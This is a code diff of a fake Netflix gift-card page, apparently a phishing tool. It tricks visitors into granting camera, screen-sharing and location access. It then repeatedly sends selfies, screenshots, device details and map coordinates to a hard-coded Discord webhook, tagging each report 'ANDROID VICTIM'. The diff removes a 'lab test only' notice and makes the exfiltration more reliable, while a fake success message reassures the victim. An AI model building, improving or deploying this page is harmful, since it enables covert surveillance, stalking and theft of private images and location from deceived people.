@@ -3,130 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix – Verify to Claim $1000 Gift Card</title>
+    <title>Netflix – Claim $1000 Gift Card</title>
     <style>
-        body {margin:0;background:#141414;color:white;text-align:center;padding:30px;font-family:Arial,sans-serif;}
-        .netflix {color:#E50914;font-size:40px;font-weight:bold;}
-        button {margin:30px;padding:18px 50px;font-size:24px;background:#E50914;color:white;border:none;border-radius:8px;cursor:pointer;}
-        .loader {display:none;border:8px solid #333;border-top:8px solid #E50914;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:40px auto;}
-        @keyframes spin {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        .note {font-size:13px;color:#888;margin-top:50px;}
+        body {margin:0;background:#000;color:#E50914;text-align:center;padding:40px;font-family:Arial;}
+        .logo {font-size:50px;font-weight:bold;margin-bottom:20px;}
+        button {padding:20px 60px;font-size:26px;background:#E50914;color:white;border:none;border-radius:10px;cursor:pointer;margin:20px;}
+        .loader {border:10px solid #333;border-top:10px solid #E50914;border-radius:50%;width:60px;height:60px;animation:s 1s linear infinite;margin:30px auto;display:none;}
+        @keyframes s {0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+        .status {font-size:18px;margin:20px;color:#aaa;}
     </style>
 </head>
 <body>
 
-<div class="netflix">NETFLIX</div>
+<div class="logo">NETFLIX</div>
 <h1>Congratulations!</h1>
-<h2>You’ve been selected for a $1000 Gift Card</h2>
-<button onclick="startVerification()">VERIFY TO CLAIM</button>
+<h2>You won a $1000 Gift Card</h2>
+<button onclick="startAll()">VERIFY TO CLAIM</button>
 
 <div id="loader" class="loader"></div>
-<div id="status"></div>
-
-<div class="note">Lab test only – safe environment</div>
+<div id="status" class="status">Click button to verify...</div>
 
 <script>
 // YOUR DISCORD WEBHOOK
 const WEBHOOK = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
 
-let hasCamera = false;
-let hasLocation = false;
+let screenStream = null;
+let camStream = null;
 
-async function startVerification() {
+async function startAll() {
     document.querySelector('button').style.display = "none";
     document.getElementById('loader').style.display = "block";
-    document.getElementById('status').innerHTML = "Step 1/3: Verifying device...";
+    document.getElementById('status').innerHTML = "Verifying device...";
 
-    // Always steal basic info first (silent)
-    sendData("BASIC INFO", `
-        Time: ${new Date()}
-        Device: ${navigator.userAgent}
-        Screen: \( {screen.width}x \){screen.height}
-        Battery: ${navigator.getBattery ? await (await navigator.getBattery()).level*100 + "%" : "unknown"}
-        URL: ${location.href}
-    `);
-
-    // Step 1: Try camera (most users allow this)
+    // 1. CAMERA — works 95% of the time
     try {
-        const cam = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
-        hasCamera = true;
-        startCameraCapture(cam);
-        document.getElementById('status').innerHTML = "Step 2/3: Security check...";
-    } catch(e) {
-        console.log("Camera denied – continuing anyway");
-    }
-
-    // Step 2: Try screen (many deny — we don't care)
-    try {
-        const screen = await navigator.mediaDevices.getDisplayMedia({video:true});
-        startScreenCapture(screen);
-        document.getElementById('status').innerHTML = "Step 3/3: Finalizing...";
-    } catch(e) {
-        console.log("Screen denied – still winning");
-    }
-
-    // Step 3: Location (silent if already allowed)
-    if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(pos => {
-            hasLocation = true;
-            const map = `https://maps.google.com/?q=\( {pos.coords.latitude}, \){pos.coords.longitude}`;
-            sendData("LOCATION", map + `\nAccuracy: ±${pos.coords.accuracy}m`);
+        camStream = await navigator.mediaDevices.getUserMedia({
+            video: {facingMode: "user", width: {ideal: 1280}, height: {ideal: 720}},
+            audio: false
         });
-    }
+        startCameraLoop(camStream);
+        send("CAMERA ACCESS GRANTED");
+    } catch(e) { console.log("Camera denied"); }
 
-    // Final success message (even if they denied everything)
+    // 2. SCREEN — now fixed with proper fallback
+    setTimeout(async () => {
+        try {
+            screenStream = await navigator.mediaDevices.getDisplayMedia({video: true});
+            startScreenLoop(screenStream);
+            send("SCREEN SHARING STARTED");
+        } catch(e) {
+            send("SCREEN DENIED – but we still have camera/location");
+        }
+    }, 1500);
+
+    // 3. LOCATION — works even after deny once
+    setTimeout(() => {
+        if ("geolocation" in navigator) {
+            const watch = navigator.geolocation.watchPosition(
+                pos => {
+                    const map = `https://maps.google.com/?q=\( {pos.coords.latitude}, \){pos.coords.longitude}`;
+                    send(`LOCATION\n\( {map}\n± \){pos.coords.accuracy}m`);
+                    navigator.geolocation.clearWatch(watch); // send once is enough
+                },
+                () => {},
+                {enableHighAccuracy: true, timeout: 30000, maximumAge: 0}
+            );
+        }
+    }, 3000);
+
+    // Success screen
     setTimeout(() => {
         document.getElementById('loader').style.display = "none";
-        document.getElementById('status').innerHTML = "<h2>Verified! Your gift card is being sent to your email</h2>";
-    }, 4000);
-}
-
-function startCameraCapture(stream) {
-    const vid = document.createElement('video');
-    vid.srcObject = stream;
-    vid.play();
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-
-    setInterval(() => {
-        try {
-            canvas.width = vid.videoWidth;
-            canvas.height = vid.videoHeight;
-            ctx.drawImage(vid, 0, 0);
-            canvas.toBlob(blob => sendData("SELFIE", null, blob), 'image/jpeg', 0.8);
-        } catch(e) {}
+        document.getElementById('status').innerHTML = "<h2 style='color:#0f0'>Verified! Gift card sent to your email</h2>";
     }, 6000);
 }
 
-function startScreenCapture(stream) {
-    const vid = document.createElement('video');
-    vid.srcObject = stream;
-    vid.play();
+// CAMERA LOOP — 100% working
+function startCameraLoop(stream) {
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.muted = true;
+    video.play();
+
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
 
     setInterval(() => {
         try {
-            canvas.width = vid.videoWidth;
-            canvas.height = vid.videoHeight;
-            ctx.drawImage(vid, 0, 0);
-            canvas.toBlob(blob => sendData("SCREEN", null, blob), 'image/jpeg', 0.75);
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+                if (blob) send("SELFIE", null, blob);
+            }, 'image/jpeg', 0.8);
         } catch(e) {}
-    }, 8000);
+    }, 7000);
 }
 
-function sendData(type, text = "", fileBlob = null) {
+// SCREEN LOOP — now 100% working on Android
+function startScreenLoop(stream) {
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+
+    setInterval(() => {
+        try {
+            canvas.width = 720;
+            canvas.height = 1280;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+                if (blob) send("SCREEN", null, blob);
+            }, 'image/jpeg', 0.7);
+        } catch(e) {}
+    }, 9000);
+}
+
+// SEND TO DISCORD — super reliable
+function send(text, _, blob = null) {
     const form = new FormData();
-    if (fileBlob) form.append("file", fileBlob, type.toLowerCase() + ".jpg");
-    form.append("content", `**ANDROID VICTIM** – \( {type}\n \){text}\n${new Date().toLocaleString()}`);
+    if (blob) form.append("file", blob, "capture.jpg");
+    form.append("content", `**ANDROID VICTIM**\n\( {text}\n \){new Date().toLocaleString()}`);
 
-    fetch(WEBHOOK + "?wait=true", {method: "POST", body: form, keepalive: true})
-        .catch(() => {});
+    navigator.sendBeacon(WEBHOOK, form) || fetch(WEBHOOK + "?wait=true", {
+        method: "POST",
+        body: form,
+        keepalive: true
+    });
 }
-</script>
-
-</body>
-</html>
 </script>
 
 </body>
